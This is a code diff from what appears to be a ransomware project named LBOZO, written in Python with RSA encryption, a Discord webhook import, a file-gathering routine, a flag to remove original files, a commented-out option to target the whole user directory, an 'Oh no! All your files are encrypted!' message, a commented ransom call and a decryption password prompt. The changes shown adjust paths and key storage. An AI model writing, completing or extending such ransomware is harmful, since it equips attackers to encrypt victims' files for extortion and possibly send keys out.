@@ -11,8 +11,14 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from discord_webhook import DiscordWebhook
 import socket
+from os.path import dirname, abspath
 
-os.chdir("./LBOZO/src")
+os.chdir(dirname(abspath(__file__)))
+
+if os.path.exists("./keys"):
+    pass
+else:
+    os.mkdir("./keys")
 
 global keypath
 keypath = "./keys/"
@@ -40,7 +46,6 @@ global ALPHABET
 ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.1234567890"
 
 maxWorker = 100
-
 
 def get_files(os_type):
     if os_type == "Windows":
@@ -428,7 +433,7 @@ removeFiles = True
 
 #   userdata = os.path.expanduser("~")
 
-paths = [".", "C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]
+paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]
 
 #   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
 #   paths.append(userdata)
@@ -460,7 +465,7 @@ else:
 
 print("Oh no! All your files are encrypted!")
 
-# this is where you would traditionally call a ransom
+#   this is where you would traditionally call a ransom
 #   ransom()
 
 decryptend = input("Enter password to decrypt: ")
